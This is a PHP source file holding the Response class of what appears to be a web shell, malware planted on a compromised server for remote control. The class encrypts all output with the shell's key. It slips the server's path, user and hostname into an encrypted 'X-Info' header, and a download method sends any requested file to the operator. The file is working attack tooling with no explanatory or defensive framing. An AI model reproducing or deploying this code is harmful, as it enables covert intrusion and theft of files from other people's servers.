<?php
class Response{
    static $body;
    static $code = 200;
    private static $headers = array();
    static $input = "";
    public static function addHeader($name, $value){
        if(!isset(self::$headers[$name])){
            self::$headers[$name] = $value;
        }
    }
    public static function removeHeader($name){
        if(isset(self::$headers[$name])){
            unset(self::$headers[$name]);
        }
    }
    public static function setHeader($name, $value){
        self::$headers[$name] = $value;
    }
    public static function getHeader($name){
        if(isset(self::$headers[$name])){
            return self::$headers[$name];
        }
        return null;
    }
    public static function download($file){
        header('Content-Type: application/octet-stream');
        header('Content-Length: '.filesize($file));
        header('Expires: 0');
        header('Content-Disposition: filename='.basename($file));

        @readfile($file);
        exit;
    }
    public static function build(){
        if(WebShell::$path){
            self::setHeader("X-Info", Crypt::encode(($_SESSION['path'] = WebShell::$path)."|".($_SESSION['user'] = WebShell::$user).'|'.($_SESSION['hostname'] = WebShell::$hostname), WebShell::KEY));
        }
        http_response_code(self::$code);
        foreach(self::$headers as $name => $value){
            header($name.": ".$value);
        }
        exit(Crypt::encode(self::$body, WebShell::KEY));
        //exit(Crypt::encode(self::$body, WebShell::KEY));
    }
}
